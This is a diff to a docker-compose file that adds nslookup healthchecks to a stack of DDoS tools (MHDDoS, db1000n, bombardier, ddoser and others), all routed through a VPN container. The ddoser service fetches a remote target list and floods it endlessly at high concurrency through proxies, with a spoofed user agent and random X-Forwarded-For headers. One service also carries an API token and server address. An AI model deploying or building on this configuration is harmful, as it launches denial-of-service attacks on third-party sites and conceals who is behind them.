@@ -6,46 +6,91 @@ services:
     depends_on: 
       - vpn
     command: "tail -f /dev/null"
+    healthcheck:
+      test: [ "CMD", "nslookup", "google.com" ]
+      timeout: 10s
+      interval: 30s
+      retries: 3
   test:
     image: alpine/curl:3.14
     network_mode: "service:vpn"
     command: "curl --retry 5 --connect-timeout 5 -m 5 ipinfo.io"
     depends_on: 
       - vpn
+    healthcheck:
+      test: [ "CMD", "nslookup", "google.com" ]
+      timeout: 10s
+      interval: 30s
+      retries: 3
   bombardier:
     image: alpine/bombardier
     network_mode: "service:vpn"
     depends_on: 
       - vpn
+    healthcheck:
+      test: [ "CMD", "nslookup", "google.com" ]
+      timeout: 10s
+      interval: 30s
+      retries: 3
   uashield:
     build: ./uashield
     command: "500 false"
     network_mode: "service:vpn"
     depends_on: 
       - vpn
+    healthcheck:
+      test: [ "CMD", "nslookup", "google.com" ]
+      timeout: 10s
+      interval: 30s
+      retries: 3
   ddosripper:
     build: ./ddosripper
     network_mode: "service:vpn"
     depends_on: 
       - vpn
+    healthcheck:
+      test: [ "CMD", "nslookup", "google.com" ]
+      timeout: 10s
+      interval: 30s
+      retries: 3
   checksites:
     image: loginincorrect/checksites
     network_mode: "service:vpn"
     depends_on: 
       - vpn
+    healthcheck:
+      test: [ "CMD", "nslookup", "google.com" ]
+      timeout: 10s
+      interval: 30s
+      retries: 3
   db1000n:
     image: ghcr.io/arriven/db1000n
     network_mode: "service:vpn"
     depends_on: 
       - vpn
+    healthcheck:
+      test: [ "CMD", "nslookup", "google.com" ]
+      timeout: 10s
+      interval: 30s
+      retries: 3
   ddoser:
     image: imsamurai/ddoser
     command: "--target-urls-file https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt --concurrency 500 --timeout 20 --with-random-get-param --user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36' --count 0 --log-to-stdout --proxy-url 'http://143.244.166.15/proxy.list' --restart-period 600 --random-xff-ip"
+    healthcheck:
+      test: [ "CMD", "nslookup", "google.com" ]
+      timeout: 10s
+      interval: 30s
+      retries: 3
   mhddos:
     build: ./MHDDoS
     network_mode: "service:vpn"
     depends_on: 
       - vpn
+    healthcheck:
+      test: [ "CMD", "nslookup", "google.com" ]
+      timeout: 10s
+      interval: 30s
+      retries: 3
   gofucker:
     image: blogdog/go-fucker
     network_mode: "service:vpn"
@@ -54,12 +99,22 @@ services:
     environment:
       - RSGFYS_GO_FUCKER_API_TOKEN=lD1s3IOs78D10asSs23
       - RSGFYS_GO_FUCKER_SERVERS=https://188.166.179.81
+    healthcheck:
+      test: [ "CMD", "nslookup", "google.com" ]
+      timeout: 10s
+      interval: 30s
+      retries: 3
   refresher:
     build: ./refresher
     command: "${VPN_REFRESH_INTERVAL}"
     network_mode: "service:vpn"
     depends_on: 
       - vpn
+    healthcheck:
+      test: [ "CMD", "nslookup", "google.com" ]
+      timeout: 10s
+      interval: 30s
+      retries: 3
   vpn:
     image: qmcgaw/gluetun
     cap_add:
